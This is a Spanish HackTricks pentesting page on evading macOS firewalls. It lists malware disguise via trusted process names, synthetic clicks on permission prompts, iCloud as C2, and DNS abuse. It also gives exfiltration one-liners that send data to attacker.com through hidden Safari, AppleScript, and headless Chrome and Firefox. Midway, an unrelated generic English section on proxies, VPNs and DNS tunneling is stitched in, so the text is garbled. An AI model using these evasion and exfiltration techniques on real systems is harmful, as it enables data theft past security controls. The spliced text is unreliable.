# Bypassing Firewalls en macOS

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* ¿Trabajas en una **empresa de ciberseguridad**? ¿Quieres ver tu **empresa anunciada en HackTricks**? ¿O quieres tener acceso a la **última versión de PEASS o descargar HackTricks en PDF**? ¡Consulta los [**PLANES DE SUSCRIPCIÓN**](https://github.com/sponsors/carlospolop)!
* Descubre [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nuestra colección exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Obtén el [**merchandising oficial de PEASS y HackTricks**](https://peass.creator-spring.com)
* **Únete al** [**💬**](https://emojipedia.org/speech-balloon/) [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de Telegram**](https://t.me/peass) o **sígueme** en **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Comparte tus trucos de hacking enviando PRs al** [**repositorio de hacktricks**](https://github.com/carlospolop/hacktricks) **y al** [**repositorio de hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

## Técnicas encontradas

Se encontraron las siguientes técnicas que funcionan en algunas aplicaciones de firewall de macOS.

### Abuso de nombres de lista blanca

* Por ejemplo, llamar al malware con nombres de procesos conocidos de macOS como **`launchd`**&#x20;

### Clic sintético

* Si el firewall solicita permiso al usuario, hacer que el malware **haga clic en permitir**

### **Utilizar binarios firmados por Apple**

* Como **`curl`**, pero también otros como **`whois`**

### Dominios conocidos de Apple

El firewall podría permitir conexiones a dominios conocidos de Apple como **`apple.com`** o **`icloud.com`**. Y iCloud podría ser utilizado como un C2.

### Bypass genérico

Algunas ideas para intentar evadir firewalls

### Verificar el tráfico permitido

Conocer el tráfico permitido te ayudará a identificar dominios potencialmente en lista blanca o qué aplicaciones tienen permiso para acceder a ellos
```bash
lsof -i TCP -sTCP:ESTABLISHED
```
### Abuso de DNS

Las resoluciones de DNS se realizan a través de la aplicación firmada **`mdnsreponder`**, que probablemente se permitirá contactar a los servidores DNS.

<figure><img src="../../.gitbook/assets/image (1) (1) (6).png" alt=""><figcaption></figcaption></figure>

### A través de aplicaciones de navegador

* **oascript**
```applescript
tell application "Safari"
run
tell application "Finder" to set visible of process "Safari" to false
make new document
set the URL of document 1 to "https://attacker.com?data=data%20to%20exfil
end tell
```
* Google Chrome

{% code overflow="wrap" %}
```bash
"Google Chrome" --crash-dumps-dir=/tmp --headless "https://attacker.com?data=data%20to%20exfil"
```
{% endcode %}

* Firefox
```bash
firefox-bin --headless "https://attacker.com?data=data%20to%20exfil"
```
# Bypassing Firewalls in macOS

## Introduction

Firewalls are an essential security measure that protect our systems from unauthorized access and network attacks. However, as a hacker, it is crucial to understand how to bypass firewalls to gain access to restricted resources or exploit vulnerabilities.

In this chapter, we will explore techniques to bypass firewalls in macOS, specifically focusing on the Safari web browser.

## Bypassing Firewalls with Safari

Safari is the default web browser on macOS, and it comes with built-in security features. However, these features can be bypassed using various techniques.

### 1. Proxy Servers

One way to bypass firewalls is by using proxy servers. A proxy server acts as an intermediary between the user and the target website, allowing the user to access restricted content. By configuring Safari to use a proxy server, you can bypass firewall restrictions and access blocked websites.

To configure a proxy server in Safari, follow these steps:

1. Open Safari and go to **Preferences**.
2. Click on the **Advanced** tab.
3. Click on the **Change Settings** button next to **Proxies**.
4. Select the **Web Proxy (HTTP)** option and enter the proxy server's IP address and port number.
5. Click **OK** to save the changes.

### 2. VPNs

Virtual Private Networks (VPNs) can also be used to bypass firewalls. A VPN creates a secure connection between the user's device and a remote server, encrypting the traffic and hiding the user's IP address. By connecting to a VPN server outside the restricted network, you can bypass firewall restrictions and access blocked websites.

To use a VPN in Safari, follow these steps:

1. Install a VPN client on your macOS device.
2. Open the VPN client and connect to a VPN server outside the restricted network.
3. Once connected, open Safari and browse the web as usual.

### 3. DNS Tunneling

DNS tunneling is another technique that can be used to bypass firewalls. It involves encapsulating non-DNS traffic within DNS packets, allowing it to bypass firewall restrictions. By using a DNS tunneling tool, you can redirect your Safari traffic through DNS queries, effectively bypassing firewalls.

To use DNS tunneling in Safari, follow these steps:

1. Install a DNS tunneling tool on your macOS device.
2. Configure the tool to redirect Safari traffic through DNS queries.
3. Open Safari and browse the web as usual.

## Conclusion

Bypassing firewalls in macOS, particularly with Safari, requires a good understanding of the techniques and tools available. By using proxy servers, VPNs, or DNS tunneling, you can bypass firewall restrictions and gain access to restricted resources. However, it is important to note that these techniques should only be used for ethical purposes, such as penetration testing or authorized security assessments.
```bash
open -j -a Safari "https://attacker.com?data=data%20to%20exfil"
```
### A través de inyecciones de procesos

Si puedes **inyectar código en un proceso** que tiene permiso para conectarse a cualquier servidor, podrías evadir las protecciones del firewall:

{% content-ref url="macos-proces-abuse/" %}
[macos-proces-abuse](macos-proces-abuse/)
{% endcontent-ref %}

## Referencias

* [https://www.youtube.com/watch?v=UlT5KFTMn2k](https://www.youtube.com/watch?v=UlT5KFTMn2k)

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* ¿Trabajas en una **empresa de ciberseguridad**? ¿Quieres que tu **empresa sea anunciada en HackTricks**? ¿O quieres tener acceso a la **última versión de PEASS o descargar HackTricks en PDF**? ¡Consulta los [**PLANES DE SUSCRIPCIÓN**](https://github.com/sponsors/carlospolop)!
* Descubre [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nuestra colección exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Obtén el [**merchandising oficial de PEASS y HackTricks**](https://peass.creator-spring.com)
* **Únete al** [**💬**](https://emojipedia.org/speech-balloon/) [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de Telegram**](https://t.me/peass) o **sígueme** en **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Comparte tus trucos de hacking enviando PRs al** [**repositorio de hacktricks**](https://github.com/carlospolop/hacktricks) **y al** [**repositorio de hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
